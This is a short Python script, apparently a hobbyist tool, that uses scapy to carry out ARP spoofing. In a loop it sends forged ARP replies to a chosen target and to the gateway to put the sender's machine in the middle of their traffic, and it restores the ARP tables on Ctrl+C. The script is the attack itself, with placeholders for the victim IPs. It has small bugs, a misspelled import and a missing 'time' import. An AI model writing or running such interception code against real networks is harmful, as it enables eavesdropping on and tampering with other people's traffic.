import scappy.all as scapy
import sys

# getting the mac address  using ip
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) #creating ARP packet 
    broadcast = scapy.Ether(dst= "ff:ff:ff:ff:ff:ff") # creating Ethernet object
    arp_request_broadcast = broadcast/arp_request # appending two packets to send
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0] # sending packets and receiving a response 
    return answered_list[0][1].hwsrc # getting the mac address
    

#sending ARP packets
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip) 
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip ) # creating ARP response packet
    scapy.send(packet, verbose=False) # sending the packet

    
#Restoring ARP table back to normall
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst= destination_mac, psrc= source_ip, hwsrc=source_mac)
    scapy.send(packet, count =4, verbose = False) # sending packets 4 times 
    

target_ip = ... # replace ... with target ip
gateway_ip = ... # replace ... with the gateway ip

sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip) # sending packets to router
        spoof(gateway_ip, target_ip) # sending packets to client
        sent_packets_count = sent_packets_count + 2 # updating number of packets sent 
        print( "\r[+]Packets sent: "  + str(sent_packets_count), end="") # printing message on the screen
        time.sleep(2) #adding delay of 2 sec
except KeyboardInterrupt:
    print(" [+] Detected CTRL + C ... Resetting ARP tables...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
